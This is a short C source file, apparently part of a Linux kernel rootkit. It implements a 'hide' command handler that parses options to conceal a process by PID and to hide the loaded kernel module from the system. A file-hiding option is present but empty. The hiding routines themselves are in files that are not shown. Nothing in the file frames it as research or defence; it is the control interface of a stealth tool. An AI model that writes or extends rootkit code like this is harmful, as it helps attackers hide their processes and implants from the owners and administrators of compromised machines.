#include <asm-generic/errno-base.h>

#include "commands/hide.h"
#include "lib/ketopt.h"
#include "proc_hide.h"
#include "module_hide.h"
#include "log.h"

enum { opt_hide_pid, opt_hide_file, opt_hide_module };

const static ko_longopt_t longopts[] = {
	{ "pid", ko_required_argument, opt_hide_pid },
	{ "file", ko_required_argument, opt_hide_file },
	{ "module", ko_no_argument, opt_hide_module },
	{ NULL, 0, 0 }
};

int hide_handler(int argc, char **argv)
{
	ketopt_t o = KETOPT_INIT;
	int err = 0;
	int ret;
	int c;

	while ((c = ketopt(&o, argc, argv, 1, "", longopts)) >= 0) {
		switch (c) {
		case opt_hide_pid:
			if (o.arg) {
				ret = proc_hide_add(o.arg);
				if (ret) {
					IMLOG_WARNING("%s not hidden\n", o.arg);
					err++;
				}
			} else {
				err++;
			}
			break;
		case opt_hide_file:
			break;
		case opt_hide_module:
			err += module_hide();
			break;
		}
	}

	return err ? -EINVAL : 0;
}
